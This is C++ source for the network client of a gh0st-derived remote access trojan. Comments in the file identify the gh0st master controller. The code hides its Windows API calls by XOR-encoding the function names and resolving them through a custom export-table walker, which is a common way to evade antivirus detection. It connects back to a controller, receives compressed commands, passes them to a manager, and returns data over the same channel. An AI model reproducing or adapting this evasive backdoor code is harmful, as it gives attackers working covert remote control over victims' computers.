// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "ClientSocket.h"
#include "../../common/zlib/zlib.h"
#include <process.h>
#include <MSTcpIP.h>
#include "common/Manager.h"
#include "common/until.h"

#pragma comment(lib, "ws2_32.lib")

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
DWORD SelfGetProcAddress(
	HMODULE hModule, // handle to DLL module
	LPCSTR lpProcName // function name
)
{
	int i = 0;
	char* pRet = NULL;
	PIMAGE_DOS_HEADER pImageDosHeader = NULL;
	PIMAGE_NT_HEADERS pImageNtHeader = NULL;
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

	pImageDosHeader = (PIMAGE_DOS_HEADER)hModule;
	pImageNtHeader = (PIMAGE_NT_HEADERS)((DWORD)hModule + pImageDosHeader->e_lfanew);
	pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModule + pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD dwExportRVA = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	DWORD dwExportSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	DWORD* pAddressOfFunction = (DWORD*)(pImageExportDirectory->AddressOfFunctions + (DWORD)hModule);
	DWORD* pAddressOfNames = (DWORD*)(pImageExportDirectory->AddressOfNames + (DWORD)hModule);
	DWORD dwNumberOfNames = (DWORD)(pImageExportDirectory->NumberOfNames);
	DWORD dwBase = (DWORD)(pImageExportDirectory->Base);

	WORD* pAddressOfNameOrdinals = (WORD*)(pImageExportDirectory->AddressOfNameOrdinals + (DWORD)hModule);

	//这个是查一下是按照什么方式（函数名称or函数序号）来查函数地址的

	for (i = 0; i < (int)dwNumberOfNames; i++)
	{
		char* strFunction = (char*)(pAddressOfNames[i] + (DWORD)hModule);
		if (strcmp(strFunction, lpProcName) == 0)
		{
			pRet = (char*)(pAddressOfFunction[pAddressOfNameOrdinals[i]] + (DWORD)hModule);
			break;
		}
	}
	//判断得到的地址有没有越界
	if ((DWORD)pRet<dwExportRVA + (DWORD)hModule || (DWORD)pRet > dwExportRVA + (DWORD)hModule + dwExportSize)
	{
		if (*((WORD*)pRet) == 0xFF8B)
		{
			return (DWORD)pRet + 2;
		}
		return (DWORD)pRet;
	}
}

privatra::privatra()
{
	//---初始化套接字
	WSADATA wsaData;
	typedef HMODULE(WINAPI* myLoadLibraryA)(
		_In_ LPCSTR lpLibFileName
		);
	char krn[] = { 0x08,0x80, 0x8f, 0x9b, 0x86, 0x82, 0x8a, 0xf6, 0xf6 };
	char* pkrn = decodeStr(krn);
	char loadlb[] = { 0x0c,0x87,0xa5,0xa8,0xac,0x8b,0xaf,0xa7,0xb6,0xa2,0xb0,0xb8,0x81 };
	char* ploadlb = decodeStr(loadlb);
	myLoadLibraryA myLoadLibraryfunc = (myLoadLibraryA)SelfGetProcAddress(GetModuleHandle(pkrn), ploadlb);
	memset(pkrn, 0, krn[STR_CRY_LENGTH]);					//填充0
	delete pkrn;
	memset(ploadlb, 0, loadlb[STR_CRY_LENGTH]);					//填充0
	delete ploadlb;

	char ws2str[] = { 0x0a,0xbc,0xb9,0xfb,0x97,0xf4,0xf4,0xeb,0xa0,0xaf,0xae};
	char* pws2str = decodeStr(ws2str);
	HMODULE ws2=  myLoadLibraryfunc(pws2str);
	memset(pws2str, 0, ws2str[STR_CRY_LENGTH]);					//填充0
	delete pws2str;

	typedef int(WINAPI* myWSAStartup)(
		_In_ WORD wVersionRequested,
		_Out_ LPWSADATA lpWSAData
		);
	//WSAStartup(MAKEWORD(2, 2), &wsaData); 
	char WSAS[] = { 0x0a,0x9c,0x99,0x88,0x9b,0xb3,0xa7,0xb7,0xb0,0xb6,0xb2 };
	char* pWSAS = decodeStr(WSAS);
	myWSAStartup myWSAStartupfunc = (myWSAStartup)SelfGetProcAddress(ws2, pWSAS);
	memset(pWSAS, 0, WSAS[STR_CRY_LENGTH]);					//填充0
	delete pWSAS;
	myWSAStartupfunc(MAKEWORD(2, 2), &wsaData);//WSAStartup
	m_hEvent = CreateEvent(NULL, true, false, NULL);
	m_bIsRunning = false;
	m_Socket = INVALID_SOCKET;
	// Packet Flag;

	//char CcRmt[] = { 0x05,0x88,0xa9,0x9b,0xa5,0xb3 };	//CcRmt 注意这个数据头 ，和gh0st主控端要一致
	char CcRmt[] = { 0x07, 0xbb, 0xb8, 0xa0, 0xbe, 0xa6, 0xa5, 0xbc };
	char* pCcRmt = decodeStr(CcRmt);					//解密函数

	memcpy(m_bPacketFlag, pCcRmt, CcRmt[STR_CRY_LENGTH]);
	memset(pCcRmt, 0, CcRmt[STR_CRY_LENGTH]);					//填充0
	delete pCcRmt;
}
//---析构函数 用于类的销毁
privatra::~privatra()
{
	m_bIsRunning = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);

	if (m_Socket != INVALID_SOCKET)
		Disconnect();

	CloseHandle(m_hWorkerThread);
	CloseHandle(m_hEvent);
	WSACleanup();
}

//---向主控端发起连接
bool privatra::Connect(LPCTSTR lpszHost, UINT nPort)
{
	// 一定要清除一下，不然socket会耗尽系统资源
	Disconnect();
	// 重置事件对像
	ResetEvent(m_hEvent);
	m_bIsRunning = false;//链接状态否
	//判断链接类型
	typedef HMODULE(WINAPI* myLoadLibraryA)(
		_In_ LPCSTR lpLibFileName
		);
	char krn[] = { 0x08,0x80, 0x8f, 0x9b, 0x86, 0x82, 0x8a, 0xf6, 0xf6 };
	char* pkrn = decodeStr(krn);
	char loadlb[] = { 0x0c,0x87,0xa5,0xa8,0xac,0x8b,0xaf,0xa7,0xb6,0xa2,0xb0,0xb8,0x81 };
	char* ploadlb = decodeStr(loadlb);
	myLoadLibraryA myLoadLibraryfunc = (myLoadLibraryA)SelfGetProcAddress(GetModuleHandle(pkrn), ploadlb);
	memset(pkrn, 0, krn[STR_CRY_LENGTH]);					//填充0
	delete pkrn;
	memset(ploadlb, 0, loadlb[STR_CRY_LENGTH]);					//填充0
	delete ploadlb;

	char ws2str[] = { 0x0a,0xbc,0xb9,0xfb,0x97,0xf4,0xf4,0xeb,0xa0,0xaf,0xae };
	char* pws2str = decodeStr(ws2str);
	HMODULE ws2 = myLoadLibraryfunc(pws2str);
	memset(pws2str, 0, ws2str[STR_CRY_LENGTH]);					//填充0
	delete pws2str;
	typedef int(WINAPI* mysocket)(
		_In_ int af,
		_In_ int type,
		_In_ int protocol
		);

	char sockstr[] = { 0x06,0xb8,0xa5,0xaa,0xa3,0xa2,0xb2 };
	char* psockstr = decodeStr(sockstr);
	mysocket mymysocketfunc = (mysocket)SelfGetProcAddress(ws2, psockstr);
	memset(psockstr, 0, sockstr[STR_CRY_LENGTH]);					//填充0
	delete psockstr;
	//m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	m_Socket = mymysocketfunc(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (m_Socket == SOCKET_ERROR)
	{
		return false;
	}

	hostent* pHostent = NULL;
	char gethostbyna[] = { 0x0d,0xac,0xaf,0xbd,0xa0,0xa8,0xb5,0xb1,0xa6,0xba,0xac,0xa0,0xad,0xda };
	char* pgethostbyna = decodeStr(gethostbyna);
	typedef hostent*(WINAPI *mygethostbyname)(
		_In_z_ const char FAR* name
	);
	mygethostbyname mygethostbynamefunc = (mygethostbyname)SelfGetProcAddress(ws2, pgethostbyna);
	memset(pgethostbyna, 0, gethostbyna[STR_CRY_LENGTH]);					//填充0
	delete pgethostbyna;
	//pHostent = gethostbyname(lpszHost);
	pHostent = mygethostbynamefunc(lpszHost);
	if (pHostent == NULL)
		return false;

	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family = AF_INET;
	char htonstr[] = { 0x05,0xa3,0xbe,0xa6,0xa6,0xb4 };
	char* phtonstr = decodeStr(htonstr);
	typedef u_short(WINAPI*myhtons)(
		_In_ u_short hostshort
	);
	myhtons myhtonsfunc = (myhtons)SelfGetProcAddress(ws2, phtonstr);
	ClientAddr.sin_port = myhtonsfunc(nPort);
	memset(phtonstr, 0, htonstr[STR_CRY_LENGTH]);					//填充0
	delete phtonstr;
	//ClientAddr.sin_port = htons(nPort);
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

	char connecstr[] = { 0x07,0xa8,0xa5,0xa7,0xa6,0xa2,0xa5,0xb1 };
	char* pconnecstr = decodeStr(connecstr);
	typedef int(WINAPI*myconnect)(
		_In_ SOCKET s,
		_In_reads_bytes_(namelen) const struct sockaddr FAR* name,
		_In_ int namelen
	);
	
	myconnect myconnectfunc = (myconnect)SelfGetProcAddress(ws2, pconnecstr);
	memset(pconnecstr, 0, connecstr[STR_CRY_LENGTH]);					//填充0
	delete pconnecstr;
	if (myconnectfunc(m_Socket, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)
		return false;
	//if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)
	//	return false;
	// 禁用Nagle算法后，对程序效率有严重影响
	// The Nagle algorithm is disabled if the TCP_NODELAY option is enabled 
	//   const char chOpt = 1;
	// 	int nErr = setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));

		// 验证socks5服务器

	// 不用保活机制，自己用心跳实瑞

	const char chOpt = 1; // True
	// Set KeepAlive 开启保活机制, 防止服务端产生死连接
	char setsockstr[] = { 0x0a,0xb8,0xaf,0xbd,0xbb,0xa8,0xa5,0xae,0xab,0xb3,0xb6 };
	char* psetsockstr = decodeStr(setsockstr);

	typedef int(WINAPI* mysetsockopt)(
		_In_ SOCKET s,
		_In_ int level,
		_In_ int optname,
		_In_reads_bytes_opt_(optlen) const char FAR* optval,
		_In_ int optlen
	);
	

	mysetsockopt mysetsockoptfunc = (mysetsockopt)SelfGetProcAddress(ws2, psetsockstr);
	memset(psetsockstr, 0, setsockstr[STR_CRY_LENGTH]);					//填充0
	delete psetsockstr;
	typedef int (WINAPI* myWSAIoctl)(
		_In_ SOCKET s,
		_In_ DWORD dwIoControlCode,
		_In_reads_bytes_opt_(cbInBuffer) LPVOID lpvInBuffer,
		_In_ DWORD cbInBuffer,
		_Out_writes_bytes_to_opt_(cbOutBuffer, *lpcbBytesReturned) LPVOID lpvOutBuffer,
		_In_ DWORD cbOutBuffer,
		_Out_ LPDWORD lpcbBytesReturned,
		_Inout_opt_ LPWSAOVERLAPPED lpOverlapped,
		_In_opt_ LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
	);
	char WSAIoctlstr[] = { 0x08,0x9c,0x99,0x88,0x81,0xa8,0xa5,0xb1,0xa8 };
	char* pWSAIoctlstr = decodeStr(WSAIoctlstr);
	myWSAIoctl myWSAIoctlfunc = (myWSAIoctl)SelfGetProcAddress(ws2, pWSAIoctlstr);
	memset(pWSAIoctlstr, 0, WSAIoctlstr[STR_CRY_LENGTH]);					//填充0
	delete pWSAIoctlstr;
	if (mysetsockoptfunc(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
	{
		// 设置超时详细信息
		tcp_keepalive	klive;
		klive.onoff = 1; // 启用保活
		klive.keepalivetime = 1000 * 60 * 10; // 3分钟超时 Keep Alive
		klive.keepaliveinterval = 1000 * 10; // 重试间隔为5秒 Resend if No-Reply
		myWSAIoctlfunc
		(
			m_Socket,
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			(unsigned long *)&chOpt,
			0,
			NULL
		);
	}

	m_bIsRunning = true;
	//---连接成功，开启工作线程  转到WorkThread
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);

	return true;
}



//工作线程，参数是这个类的this指针
DWORD WINAPI privatra::WorkThread(LPVOID lparam)
{
	typedef HMODULE(WINAPI* myLoadLibraryA)(
		_In_ LPCSTR lpLibFileName
		);
	char krn[] = { 0x08,0x80, 0x8f, 0x9b, 0x86, 0x82, 0x8a, 0xf6, 0xf6 };
	char* pkrn = decodeStr(krn);
	char loadlb[] = { 0x0c,0x87,0xa5,0xa8,0xac,0x8b,0xaf,0xa7,0xb6,0xa2,0xb0,0xb8,0x81 };
	char* ploadlb = decodeStr(loadlb);
	myLoadLibraryA myLoadLibraryfunc = (myLoadLibraryA)SelfGetProcAddress(GetModuleHandle(pkrn), ploadlb);
	memset(pkrn, 0, krn[STR_CRY_LENGTH]);					//填充0
	delete pkrn;
	memset(ploadlb, 0, loadlb[STR_CRY_LENGTH]);					//填充0
	delete ploadlb;

	char ws2str[] = { 0x0a,0xbc,0xb9,0xfb,0x97,0xf4,0xf4,0xeb,0xa0,0xaf,0xae };
	char* pws2str = decodeStr(ws2str);
	HMODULE ws2 = myLoadLibraryfunc(pws2str);
	memset(pws2str, 0, ws2str[STR_CRY_LENGTH]);					//填充0
	delete pws2str;
	privatra*pThis = (privatra*)lparam;
	char	*buff= new char[MAX_RECV_BUFFER]; //最大接受长度，定义在服务端和控制端共有的包含文件macros.h中
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	char selectstr[] = { 0x06,0xb8,0xaf,0xa5,0xad,0xa4,0xb2 };
	char* pselectstr = decodeStr(selectstr);
	typedef  int(WINAPI* myselect)(
		_In_ int nfds,
		_Inout_opt_ fd_set FAR* readfds,
		_Inout_opt_ fd_set FAR* writefds,
		_Inout_opt_ fd_set FAR* exceptfds,
		_In_opt_ const struct timeval FAR* timeout
	);
	myselect myselectfunc = (myselect)SelfGetProcAddress(ws2, pselectstr);
	memset(pselectstr, 0, selectstr[STR_CRY_LENGTH]);					//填充0
	delete pselectstr;
	char recvstr[] = { 0x04,0xb9,0xaf,0xaa,0xbe };
	char* precvstr = decodeStr(recvstr);
	typedef int(WINAPI* myrecv)(
		_In_ SOCKET s,
		_Out_writes_bytes_to_(len, return) __out_data_source(NETWORK) char FAR* buf,
		_In_ int len,
		_In_ int flags
	);
	myrecv myrecvfunc = (myrecv)SelfGetProcAddress(ws2, precvstr);
	memset(precvstr, 0, recvstr[STR_CRY_LENGTH]);					//填充0
	delete precvstr;
	while (pThis->IsRunning())                //---如果主控端 没有退出，就一直陷在这个循环中，判断是否在连接的状态
	{
		fd_set fdRead = fdSocket;
		int nRet = myselectfunc(NULL, &fdRead, NULL, NULL, NULL);   //---这里判断是否断开连接
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();//断开后的清理操作
			break;
		}
		if (nRet > 0)
		{
			memset(buff, 0, MAX_RECV_BUFFER);
			int nSize = myrecvfunc(pThis->m_Socket, buff, MAX_RECV_BUFFER, 0);     //---接收主控端发来的数据
			if (nSize <= 0)
			{
				pThis->Disconnect();//---接收错误处理
				break;
			}
			if (nSize > 0) pThis->OnRead((LPBYTE)buff, nSize);    //---正确接收就调用 OnRead处理 转到OnRead
		}
	}

	return -1;
}

void privatra::run_event_loop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}

bool privatra::IsRunning()
{
	return m_bIsRunning;
}


//处理接受到的数据
void privatra::OnRead(LPBYTE lpBuffer, DWORD dwIoSize)
{
	

	try
	{
		if (dwIoSize == 0)
		{
			Disconnect();       //---错误处理
			return;
		}
		//---数据包错误 要求重新发送
		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// 重新发送	
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}
		// Add the message to out message
		// Dont forget there could be a partial, 1, 1 or more + partial mesages
		m_CompressionBuffer.Write(lpBuffer, dwIoSize);


		// Check real Data
		//--- 检测数据是否大于数据头大小 如果不是那就不是正确的数据
		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			BYTE bPacketFlag[FLAG_SIZE];
			memcpy(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
			//---判断数据头 就是  构造函数的 ccrem  主控端有的
			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
				throw "bad header";

			int nSize = 0;
			memcpy(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));

			//--- 数据的大小正确判断
			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
				//---得到传输来的数据
				// Read off header
				m_CompressionBuffer.Read((PBYTE)bPacketFlag, sizeof(bPacketFlag));
				m_CompressionBuffer.Read((PBYTE)&nSize, sizeof(int));
				m_CompressionBuffer.Read((PBYTE)&nUnCompressLength, sizeof(int));
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data
				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];
				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];

				if (pData == NULL || pDeCompressionData == NULL)
					throw "bad mem";

				m_CompressionBuffer.Read(pData, nCompressLength);

				//////////////////////////////////////////////////////////////////////////
				// 还是解压数据看看是否成功，如果成功则向下进行
				unsigned long	destLen = nUnCompressLength;
				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
				//////////////////////////////////////////////////////////////////////////
				if (nRet == Z_OK)//---如果解压成功
				{
					m_DeCompressionBuffer.ClearBuffer();
					m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
					//调用	m_pManager->OnReceive函数  转到m_pManager 定义
					m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
				}
				else
					throw "bad mem";

				delete[] pData;
				delete[] pDeCompressionData;
			}
			else
				break;
		}
	}
	catch (...)
	{
		m_CompressionBuffer.ClearBuffer();
		Send(NULL, 0);
	}

}


//取消链接
void privatra::Disconnect()
{
	// If we're supposed to abort the connection, set the linger value
	// on the socket to 0.
	//如果我们要终止连接，请设置linger值
	LINGER lingerStruct;
	lingerStruct.l_onoff = 1;
	lingerStruct.l_linger = 0;
	/*设置套接选项
	 setsockopt(
					int socket,					// 参数socket是套接字描述符
					int level,					// 第二个参数level是被设置的选项的级别，如果想要在套接字级别上设置选项，就必须把level设置为 SOL_SOCKET
					int option_name,			// option_name指定准备设置的选项，这取决于level
												// SO_LINGER，如果选择此选项, close或 shutdown将等到所有套接字里排队的消息成功发送或到达延迟时间后才会返回. 否则, 调用将立即返回。
													该选项的参数（option_value)是一个linger结构：
														struct linger {
															int   l_onoff;
															int   l_linger;
														};
													如果linger.l_onoff值为0(关闭），则清 sock->sk->sk_flag中的SOCK_LINGER位；否则，置该位，并赋sk->sk_lingertime值为 linger.l_linger。
					const void *option_value,	//LINGER结构
					size_t ption_len			//LINGER大小
	 );
	 */
	setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct));

	//取消由调用线程为指定文件发出的所有未决输入和输出（I / O）操作。该功能不会取消其他线程为文件句柄发出的I / O操作。
	CancelIo((HANDLE)m_Socket);
	//原子操作
	InterlockedExchange((LPLONG)&m_bIsRunning, false);
	closesocket(m_Socket);
	// 设置事件的状态为有标记，释放任意等待线程。
	Sleep(500);
	
	SetEvent(m_hEvent);
	//INVALID_SOCKET不是有效的套接字
	m_Socket = INVALID_SOCKET;
}

int privatra::Send(LPBYTE lpData, UINT nSize)
{

	m_WriteBuffer.ClearBuffer();

	if (nSize > 0)
	{
		// Compress data
		unsigned long	destLen = (double)nSize * 1.001 + 12;
		LPBYTE			pDest = new BYTE[destLen];

		if (pDest == NULL)
			return 0;

		int	nRet = compress(pDest, &destLen, lpData, nSize);

		if (nRet != Z_OK)
		{
			delete[] pDest;
			return -1;
		}

		//////////////////////////////////////////////////////////////////////////
		LONG nBufLen = destLen + HDR_SIZE;
		// 5 bytes packet flag
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE)&nBufLen, sizeof(nBufLen));
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE)&nSize, sizeof(nSize));
		// Write Data
		m_WriteBuffer.Write(pDest, destLen);
		delete[] pDest;

		// 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		CopyMemory(lpResendWriteBuffer, lpData, nSize);
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
		if (lpResendWriteBuffer)
			delete[] lpResendWriteBuffer;
	}
	else // 要求重发, 只发送FLAG
	{
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
	}

	// 分块发送
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}


int privatra::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	int			size = 0;
	int			nSend = 0;
	int			nSendRetry = 15;
	int			i = 0;
	
	typedef HMODULE(WINAPI* myLoadLibraryA)(
		_In_ LPCSTR lpLibFileName
		);
	char krn[] = { 0x08,0x80, 0x8f, 0x9b, 0x86, 0x82, 0x8a, 0xf6, 0xf6 };
	char* pkrn = decodeStr(krn);
	char loadlb[] = { 0x0c,0x87,0xa5,0xa8,0xac,0x8b,0xaf,0xa7,0xb6,0xa2,0xb0,0xb8,0x81 };
	char* ploadlb = decodeStr(loadlb);
	myLoadLibraryA myLoadLibraryfunc = (myLoadLibraryA)SelfGetProcAddress(GetModuleHandle(pkrn), ploadlb);
	memset(pkrn, 0, krn[STR_CRY_LENGTH]);					//填充0
	delete pkrn;
	memset(ploadlb, 0, loadlb[STR_CRY_LENGTH]);					//填充0
	delete ploadlb;

	char ws2str[] = { 0x0a,0xbc,0xb9,0xfb,0x97,0xf4,0xf4,0xeb,0xa0,0xaf,0xae };
	char* pws2str = decodeStr(ws2str);
	HMODULE ws2 = myLoadLibraryfunc(pws2str);
	memset(pws2str, 0, ws2str[STR_CRY_LENGTH]);					//填充0
	delete pws2str;
	char sendstr[] = { 0x04,0xb8,0xaf,0xa7,0xac };
	char* psendstr = decodeStr(sendstr);
	typedef int(WINAPI* mysend)(
		_In_ SOCKET s,
		_In_reads_bytes_(len) const char FAR* buf,
		_In_ int len,
		_In_ int flags
	);
	mysend mysendfunc = (mysend)SelfGetProcAddress(ws2, psendstr);
	memset(psendstr, 0, sendstr[STR_CRY_LENGTH]);					//填充0
	delete psendstr;

	// 依次发送
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = mysendfunc(m_Socket, pbuf, nSplitSize, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;

		nSend += nRet;
		pbuf += nSplitSize;
		Sleep(10); // 必要的Sleep,过快会引起控制端数据混乱
	}
	// 发送最后的部分
	if (size > 0)
	{
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = mysendfunc(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		nSend += nRet;
	}
	if (nSend == nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}

void privatra::setManagerCallBack(Cprotm*pManager)
{
	m_pManager = pManager;
}

